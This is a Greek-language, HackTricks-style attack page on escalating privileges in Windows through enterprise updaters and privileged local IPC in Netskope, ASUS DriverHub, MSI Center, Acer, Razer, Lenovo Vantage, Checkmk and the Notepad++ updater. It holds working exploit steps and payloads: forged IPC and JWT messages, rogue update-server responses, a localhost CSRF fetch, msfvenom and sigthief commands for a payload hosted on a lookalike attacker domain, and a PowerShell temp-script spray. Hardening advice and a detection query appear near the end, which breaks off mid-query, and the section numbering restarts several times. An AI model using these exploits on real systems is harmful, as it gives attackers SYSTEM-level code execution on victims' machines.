# Κατάχρηση Enterprise Auto-Updaters και Privileged IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία αλυσίδων Windows local privilege escalation που εντοπίζονται σε enterprise endpoint agents και updaters, οι οποίοι εκθέτουν μια εύκολα προσβάσιμη επιφάνεια IPC και μια privileged διαδικασία update. Αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας low-privileged χρήστης μπορεί να εξαναγκάσει την εγγραφή σε έναν server που ελέγχει ο attacker και, στη συνέχεια, να παραδώσει ένα κακόβουλο MSI που εγκαθίσταται από την υπηρεσία SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Βασικές ιδέες που μπορείτε να επαναχρησιμοποιήσετε εναντίον παρόμοιων προϊόντων:
- Καταχραστείτε το localhost IPC μιας privileged υπηρεσίας για να εξαναγκάσετε re-enrollment ή reconfiguration προς έναν server του attacker.
- Υλοποιήστε τα update endpoints του vendor, παραδώστε ένα rogue Trusted Root CA και κατευθύνετε τον updater σε ένα κακόβουλο, “signed” package.
- Παρακάμψτε αδύναμους ελέγχους signer (CN allow-lists), προαιρετικά digest flags και χαλαρές MSI properties.
- Αν το IPC είναι “encrypted”, παράγετε το key/IV από machine identifiers που είναι world-readable και αποθηκεύονται στο registry.
- Αν η υπηρεσία περιορίζει τους callers βάσει image path/process name, κάντε inject σε μια allow-listed process ή εκκινήστε μία suspended και κάντε bootstrap του DLL σας μέσω ενός minimal thread-context patch.

---
## 1) Εξαναγκασμός enrollment σε server του attacker μέσω localhost IPC

Πολλά agents περιλαμβάνουν μια user-mode UI process που επικοινωνεί με μια υπηρεσία SYSTEM μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Δημιουργήστε ένα JWT enrollment token του οποίου τα claims ελέγχουν το backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None, ώστε να μην απαιτείται signature.
2) Στείλτε το IPC message που καλεί την εντολή provisioning, μαζί με το JWT και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η service αρχίζει να επικοινωνεί με τον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται σε path/name, ξεκινήστε το request από ένα allow-listed vendor binary (βλ. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Παραβίαση του update channel για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ τον σε ένα MSI του attacker. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ σύντομο updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η service το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνουν σε ένα malicious MSI και μια fake version.

Παράκαμψη συνηθισμένων ελέγχων που συναντώνται στην πράξη:
- Signer CN allow-list: η service μπορεί να ελέγχει μόνο αν το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπεριλάβετε ένα benign MSI property με όνομα CERT_DIGEST. Δεν υπάρχει enforcement κατά την εγκατάσταση.
- Optional digest enforcement: ένα config flag (π.χ. check_msi_digest=false) απενεργοποιεί την επιπλέον cryptographic validation.

Αποτέλεσμα: η SYSTEM service εγκαθιστά το MSI από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code ως NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Μάθημα από το patch-bypass: αν ένας vendor απαντήσει επιτρέποντας μόνο ένα μικρό σύνολο “trusted” domains αντί να αυθεντικοποιεί cryptographically την update source, αναζητήστε vendor-owned redirectors ή reverse proxies που εξακολουθούν να σας επιτρέπουν να κατευθύνετε την κίνηση. Στην περίπτωση της Netskope, δημόσια follow-up research έδειξε ότι ένα allow-list της εποχής R129 μπορούσε ακόμη να γίνει abuse μέσω του `rproxy.goskope.com`, το οποίο έκανε proxy περιεχόμενο από Azure App Service που ελεγχόταν από attacker. Αντιμετωπίζετε τα hostname allow-lists ως speed bump και όχι ως trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (όταν είναι διαθέσιμα)

Από την R127, η Netskope τύλιγε το IPC JSON σε ένα encryptData field που μοιάζει με Base64. Το reversing έδειξε AES με key/IV που προέρχονται από registry values αναγνώσιμα από οποιονδήποτε user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν την encryption και να στέλνουν valid encrypted commands από έναν standard user.<sup>[[1]](#references)[[2]](#references)</sup> Γενική συμβουλή: αν ένας agent ξαφνικά “κρυπτογραφεί” το IPC του, αναζητήστε device IDs, product GUIDs και install IDs κάτω από το HKLM ως material.

---
## 4) Bypassing IPC caller allow-lists (έλεγχοι path/name)

Ορισμένες services προσπαθούν να αυθεντικοποιήσουν το peer επιλύοντας το PID της TCP connection και συγκρίνοντας το image path/name με allow-listed vendor binaries που βρίσκονται κάτω από το Program Files (π.χ. stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικά bypasses:
- DLL injection σε allow-listed process (π.χ. nsdiag.exe) και proxy του IPC από το εσωτερικό του.
- Εκκίνηση ενός allow-listed binary σε suspended κατάσταση και bootstrap του proxy DLL χωρίς CreateRemoteThread (βλ. §5), ώστε να ικανοποιούνται οι driver-enforced tamper rules.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Τα products συχνά διαθέτουν έναν minifilter/OB callbacks driver (π.χ. Stadrv) για να αφαιρεί dangerous rights από handles προς protected processes:
- Process: αφαιρεί τα PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει στα THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user-mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Απόκτηση των handles που εξακολουθείτε να επιτρέπεται να χρησιμοποιήσετε: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στο process και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME αν κάνετε patch τον κώδικα σε γνωστό RIP).
3) Overwrite του ntdll!NtContinue (ή άλλου early, guaranteed-mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο DLL path σας και στη συνέχεια επιστρέφει με jump.
4) ResumeThread για να ενεργοποιήσετε το stub in-process και να φορτώσετε το DLL σας.

Επειδή δεν χρησιμοποιήσατε ποτέ PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ήδη-protected process (εσείς το δημιουργήσατε), η policy του driver ικανοποιείται.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- Το NachoVPN (Netskope plugin) αυτοματοποιεί ένα rogue CA, το malicious MSI signing και εξυπηρετεί τα απαιτούμενα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- Το UpSkope είναι ένας custom IPC client που δημιουργεί arbitrary (προαιρετικά AES-encrypted) IPC messages και περιλαμβάνει το suspended-process injection, ώστε να προέρχονται από allow-listed binary.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow για άγνωστες επιφάνειες updater/IPC

Όταν αντιμετωπίζετε έναν νέο endpoint agent ή μια “helper” suite για motherboard, ένα σύντομο workflow συνήθως αρκεί για να διαπιστώσετε αν έχετε απέναντί σας έναν πολλά υποσχόμενο στόχο privesc:<sup>[[6]](#references)</sup>

1) Enumerate τους loopback listeners και αντιστοιχίστε τους στα vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerate υποψήφια named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Εξαγάγετε δεδομένα δρομολόγησης που υποστηρίζονται από το registry και χρησιμοποιούνται από plugin-based διακομιστές IPC:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Αρχικά, εξαγάγετε τα ονόματα των endpoints, τα JSON keys και τα command IDs από τον user-mode client. Τα packed Electron/.NET frontends συχνά κάνουν leak ολόκληρο το schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Αναζητήστε το πραγματικό κριτήριο εμπιστοσύνης, όχι απλώς τη διαδρομή κώδικα που τελικά εκκινεί το process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Μοτίβα που αξίζει να ιεραρχήσετε:
- Η χρήση του `CryptQueryObject`/certificate parsing χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το «υπάρχει certificate» αντιμετωπίστηκε ως «το certificate είναι trusted», επιτρέποντας certificate cloning ή άλλα fake-signer tricks.
- Οι έλεγχοι substring/suffix στα `Origin`, `Referer`, στα download URLs, στα process names ή στα signer CNs δεν αποτελούν authentication. Το `contains(".vendor.com")` είναι συνήθως exploitable μέσω attacker-controlled lookalike domains.
- Αν το low-privileged GUI αποφασίζει ότι «το file είναι trusted» και ο SYSTEM broker απλώς καταναλώνει αυτό το αποτέλεσμα, η επιδιόρθωση ή η επανυλοποίηση του client-side DLL/JS συχνά παρακάμπτει πλήρως το boundary (Razer-style split validation).
- Αν ο broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και στη συνέχεια το επικυρώνει ή το προγραμματίζει από εκείνο το path, ελέγξτε αμέσως για TOCTOU replacement windows και για sibling plugin modules που εκθέτουν εναλλακτικά `ExecuteTask()` wrappers με ασθενέστερους ελέγχους.<sup>[[6]](#references)</sup>

Για targets με έντονη χρήση named pipes, το PipeViewer είναι ένας γρήγορος τρόπος εντοπισμού αδύναμων DACLs και remotely reachable pipes, πριν ξεκινήσετε να κάνετε reverse το protocol σε βάθος.<sup>[[11]](#references)</sup>

Αν το target κάνει authentication των callers μόνο μέσω PID, image path ή process name, αντιμετωπίστε το ως speed bump και όχι ως boundary: το injecting στον legitimate client ή η δημιουργία της connection από allow-listed process συχνά αρκεί για να ικανοποιηθούν οι έλεγχοι του server. Ειδικά για named pipes, [αυτή η σελίδα σχετικά με client impersonation και pipe abuse](named-pipe-client-impersonation.md) καλύπτει το primitive με περισσότερες λεπτομέρειες.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (μοτίβο Lenovo Vantage)

Μια νεότερη παραλλαγή που αξίζει να αναζητήσετε είναι το **signed-client RPC broker**: μια low-privileged Lenovo-signed desktop process επικοινωνεί με ένα SYSTEM service και το service δρομολογεί JSON commands σε ένα σύνολο XML-described add-ins κάτω από το `%ProgramData%`. Μόλις επιτευχθεί code execution **μέσα σε οποιοδήποτε accepted signed client**, κάθε contract με `runas="system"` γίνεται μέρος του attack surface σας.<sup>[[15]](#references)</sup>

High-value primitives που παρατηρήθηκαν σε Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers απέκτησαν authenticated context αντιγράφοντας ένα Lenovo-signed EXE σε writable directory και ικανοποιώντας ένα DLL side-load (`profapi.dll`), ώστε arbitrary code να εκτελεστεί μέσα σε client που το service ήδη εμπιστευόταν.
- **Manifest-driven attack surface discovery**: τα add-ins δηλώνονται κάτω από `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`. Αρκετά contracts εκτελούνται ως `SYSTEM`, επομένως η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τα πραγματικά privileged verbs γρηγορότερα από το reverse του ίδιου του broker.
- **Per-command bugs behind the authenticated channel**: μόλις βρεθείτε μέσα στον trusted client, public research εντόπισε path-traversal + race conditions σε update/install verbs, raw-SQL abuse σε privileged settings databases και substring-based registry path checks που επέτρεπαν writes εκτός του intended hive.

Χρήσιμο recon σε ένα target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Πρακτικό συμπέρασμα: κάθε φορά που μια helper suite εκθέτει έναν broker ο οποίος πρώτα authenticates το **caller process** και έπειτα κάνει dispatch σε δεκάδες εντολές plugin/add-in, μην σταματάτε αφού παρακάμψετε τον front-door trust check. Κάντε dump τον manifest/contract table και κάντε fuzz κάθε high-privilege verb ανεξάρτητα· το authenticated channel συνήθως κρύβει αρκετά second-stage bugs.

---
## 1) Browser-to-localhost CSRF εναντίον privileged HTTP APIs (ASUS DriverHub)

Το DriverHub παρέχει μια user-mode HTTP service (ADU.exe) στο 127.0.0.1:53000, η οποία αναμένει browser calls που προέρχονται από το https://driverhub.asus.com. Το origin filter εκτελεί απλώς `string_contains(".asus.com")` πάνω στο Origin header και στα download URLs που εκτίθενται από το `/asus/v1.0/*`. Επομένως, οποιοδήποτε attacker-controlled host, όπως το `https://driverhub.asus.com.attacker.tld`, περνά τον έλεγχο και μπορεί να εκτελεί state-changing requests από JavaScript.<sup>[[6]](#references)</sup> Δείτε τα [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) για πρόσθετα bypass patterns.

Πρακτική ροή:
1) Κάντε register ένα domain που περιέχει το `.asus.com` και κάντε host εκεί μια malicious webpage.
2) Χρησιμοποιήστε `fetch` ή XHR για να καλέσετε ένα privileged endpoint (π.χ. `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλτε το JSON body που αναμένει ο handler – το packed frontend JS εμφανίζει το schema παρακάτω.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμα και το παρακάτω PowerShell CLI εκτελείται επιτυχώς όταν το Origin header πλαστογραφείται στην έμπιστη τιμή:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Ως εκ τούτου, κάθε επίσκεψη browser στον attacker site γίνεται local CSRF με 1 click (ή 0 click μέσω `onload`), το οποίο χειρίζεται έναν SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει arbitrary executables που ορίζονται στο JSON body και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η validation του download URL επαναχρησιμοποιεί την ίδια substring logic, επομένως το `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται αποδεκτό. Μετά το download, το ADU.exe απλώς ελέγχει ότι το PE περιέχει signature και ότι το Subject string ταιριάζει με ASUS πριν το εκτελέσει – χωρίς `WinVerifyTrust` και χωρίς chain validation.

Για να γίνει weaponize το flow:
1) Δημιουργήστε ένα payload (π.χ. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον signer της ASUS σε αυτό (π.χ. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε lookalike domain του `.asus.com` και κάντε trigger το UpdateApp μέσω του παραπάνω browser CSRF.

Επειδή τόσο τα Origin όσο και τα URL filters βασίζονται σε substring και ο signer check συγκρίνει μόνο strings, το DriverHub κατεβάζει και εκτελεί το attacker binary με το elevated context του.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU μέσα στα updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Η SYSTEM service του MSI Center εκθέτει ένα TCP protocol, όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το core component (Component ID `0f 27 00 00`) περιλαμβάνει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το executable που δόθηκε στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει το signature μέσω του `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να ισούται με “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να επιτυγχάνει).
3) Δημιουργεί scheduled task που εκτελεί το temp file ως SYSTEM με attacker-controlled arguments.

Το copied file δεν κλειδώνεται μεταξύ του verification και του `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει το Frame A με αναφορά σε ένα legitimate MSI-signed binary (εγγυάται ότι ο signature check θα περάσει και ότι το task θα μπει στην ουρά).
- Κάνει race με επαναλαμβανόμενα μηνύματα Frame B που αναφέρονται σε malicious payload, overwriting το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση του verification.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το overwritten payload ως SYSTEM, παρότι είχε γίνει validation του αρχικού file. Η reliable exploitation χρησιμοποιεί δύο goroutines/threads που κάνουν spam το CMD_AutoUpdateSDK μέχρι να κερδηθεί το TOCTOU window.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να κάνουν route commands σε arbitrary modules.
- Τα plugins μπορούν να ορίζουν τους δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` χωρίς signature validation – οποιοσδήποτε local user μπορεί να το δείξει στο `C:\Users\<user>\Desktop\payload.exe` και να αποκτήσει SYSTEM execution deterministically.
- Το sniffing του loopback με Wireshark ή η instrumentation των .NET binaries στο dnSpy αποκαλύπτει γρήγορα το Component ↔ command mapping· custom Go/ Python clients μπορούν έπειτα να κάνουν replay frames.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode` και το discretionary ACL του επιτρέπει remote clients (π.χ. `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή του command ID `7` με file path καλεί τη process-spawning routine της service.
- Η client library κάνει serialize ένα magic terminator byte (113) μαζί με τα args. Η dynamic instrumentation με Frida/`TsDotNetLib` (δείτε το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για tips σχετικά με instrumentation) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε ένα `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με 114 (`0x72`) οδηγεί στο generic branch, το οποίο διατηρεί ολόκληρο το SYSTEM token και ορίζει high-integrity SID (`S-1-16-12288`). Επομένως, το spawned binary εκτελείται ως unrestricted SYSTEM, τόσο locally όσο και cross-machine.
- Συνδυάστε το με το εκτεθειμένο installer flag (`Setup.exe -nocheck`) για να θέσετε σε λειτουργία το ACC ακόμη και σε lab VMs και να δοκιμάσετε το pipe χωρίς vendor hardware.<sup>[[6]](#references)</sup>

Αυτά τα IPC bugs αναδεικνύουν γιατί οι localhost services πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) και γιατί κάθε module’s “run arbitrary binary” helper πρέπει να χρησιμοποιεί τα ίδια signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο pattern σε αυτή την οικογένεια: ένας low-privileged user μπορεί να ζητήσει από έναν COM helper να εκκινήσει ένα process μέσω του `RzUtility.Elevator`, ενώ η απόφαση trust ανατίθεται σε ένα user-mode DLL (`simple_service.dll`) αντί να επιβάλλεται robustly μέσα στο privileged boundary.

Observed exploitation path:
- Κάντε instantiate το COM object `RzUtility.Elevator`.
- Καλέστε το `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε elevated launch.
- Στο public PoC, το PE-signature gate μέσα στο `simple_service.dll` γίνεται patch out πριν από την έκδοση του request, επιτρέποντας την εκκίνηση ενός arbitrary attacker-chosen executable.<sup>[[6]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Γενικό συμπέρασμα: κατά την ανάλυση σουίτων «helper», μην περιορίζεστε στο localhost TCP ή στα named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater` ή `Utility` και, στη συνέχεια, επαληθεύστε αν η privileged service επικυρώνει η ίδια το target binary ή αν απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζεται από ένα τροποποιήσιμο user-mode client DLL. Αυτό το pattern γενικεύεται πέρα από τη Razer: κάθε split design όπου ο high-privilege broker καταναλώνει μια απόφαση allow/deny από την low-privilege πλευρά αποτελεί πιθανό privesc surface.


---
## Προβλέψιμη εκτέλεση προσωρινού script κατά την επιδιόρθωση MSI (Checkmk Agent / CVE-2024-0670)

Ορισμένοι Windows agents εξακολουθούν να υλοποιούν privileged actions γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το όνομα του αρχείου είναι προβλέψιμο και η service δεν δημιουργεί με ασφαλή τρόπο τα υπάρχοντα αρχεία από την αρχή, ένας low-privileged user μπορεί να δημιουργήσει εκ των προτέρων το μελλοντικό προσωρινό αρχείο ως **read-only** και να κάνει την privileged process να εκτελέσει attacker-controlled content αντί για το δικό της script.

Παρατηρήθηκε σε ευάλωτα builds του Checkmk Agent:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** του cached agent package<sup>[[8]](#references)[[9]](#references)</sup>

Πρακτικό workflow:
1. Εκτιμήστε ένα ρεαλιστικό PID range από τα τρέχοντα process IDs ή από το PID του agent που εκτελείται.
2. Γράψτε ένα σύντομο **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ή ανακατεύθυνση μέσω `cmd.exe`· αποφύγετε output του PowerShell σε UTF-16 για batch files).
3. Κάντε spray το `C:\Windows\Temp\cmk_all_<PID>_1.cmd` σε ολόκληρο το candidate range και ορίστε κάθε αρχείο ως read-only.
4. Ενεργοποιήστε repair του cached MSI, ώστε η privileged service να προσπαθήσει να δημιουργήσει ξανά και, στη συνέχεια, να εκτελέσει το προσωρινό script.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Εάν το ευάλωτο προϊόν έχει εγκατασταθεί με το Windows Installer, αντιστοιχίστε το cached MSI που μοιάζει τυχαίο, κάτω από το `C:\Windows\Installer`, με το όνομα του προϊόντος πριν εκκινήσετε την επιδιόρθωση:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- Το `qwinsta` είναι χρήσιμο όταν το `msiexec /fa` αποτυγχάνει από ένα μη διαδραστικό WinRM shell και χρειάζεται να κατανοήσετε αν μια υπάρχουσα desktop/disconnected session μπορεί να ενεργοποιήσει σωστά το repair.<sup>[[7]](#references)</sup>
- Αυτό το μοτίβο γενικεύεται σε άλλους endpoint agents και updaters που **τοποθετούν προσωρινά scripts σε world-writable τοποθεσίες και αργότερα τα εκτελούν ως SYSTEM**. Ελέγξτε για προβλέψιμα ονόματα, απουσία exclusive create semantics και ροές repair/update που μπορούν να ενεργοποιηθούν κατ' απαίτηση.

---
## Remote supply-chain hijack μέσω αδύναμου updater validation (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, attackers που είχαν παραβιάσει την hosting infrastructure πίσω από το update flow του Notepad++ παρείχαν επιλεκτικά malicious manifests σε επιλεγμένα victims. Παλαιότερα WinGUp-based updaters δεν επαλήθευαν πλήρως την authenticity των updates, επομένως μια hostile XML response μπορούσε να ανακατευθύνει clients σε attacker-controlled URLs. Επειδή ο client αποδεχόταν περιεχόμενο HTTPS χωρίς να επιβάλλει τόσο trusted certificate chain όσο και valid PE signature στο downloaded installer, τα victims κατέβαζαν και εκτελούσαν ένα trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (δεν απαιτείται local exploit):
1. **Infrastructure interception**: compromise CDN/hosting και απάντηση στους update checks με attacker metadata που δείχνει σε malicious download URL.
2. **Trojanized NSIS**: ο installer κατεβάζει/εκτελεί ένα payload και κάνει abuse δύο execution chains:
- **Bring-your-own signed binary + sideload**: συμπεριλάβετε το signed Bitdefender `BluetoothService.exe` και τοποθετήστε ένα malicious `log.dll` στο search path του. Όταν εκτελείται το signed binary, τα Windows κάνουν sideload το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει reflectively το Chrysalis backdoor (Warbird-protected + API hashing για παρεμπόδιση του static detection).
- **Scripted shellcode injection**: το NSIS εκτελεί ένα compiled Lua script που χρησιμοποιεί Win32 APIs (π.χ. `EnumWindowStationsW`) για να κάνει inject shellcode και να προετοιμάσει το Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Hardening/detection takeaways για οποιονδήποτε auto-updater:
- Επιβάλετε **certificate + signature verification** του downloaded installer (κάντε pin τον vendor signer, απορρίψτε mismatched CN/chain) και υπογράψτε το ίδιο το update manifest (π.χ. XMLDSig). Αποκλείστε manifest-controlled redirects εκτός αν έχουν validated.
- Αντιμετωπίστε το **BYO signed binary sideloading** ως post-download detection pivot: δημιουργήστε alert όταν ένα signed vendor EXE φορτώνει ένα DLL name εκτός του canonical install path του (π.χ. το Bitdefender φορτώνει `log.dll` από Temp/Downloads) και όταν ένας updater τοποθετεί/εκτελεί installers από temp με non-vendor signatures.
- Παρακολουθείτε **malware-specific artifacts** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως generic pivots): το mutex `Global\Jdhfv_1.0.1`, anomalous writes του `gup.exe στο `%TEMP%`, και Lua-driven shellcode injection stages.
- Το Notepad++ αντέδρασε ενισχύοντας το WinGUp στην έκδοση v8.8.9 και μεταγενέστερες: το XML που επιστρέφεται είναι πλέον signed (XMLDSig), και τα νεότερα builds επιβάλλουν certificate + signature verification του downloaded installer αντί να εμπιστεύονται μόνο το transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
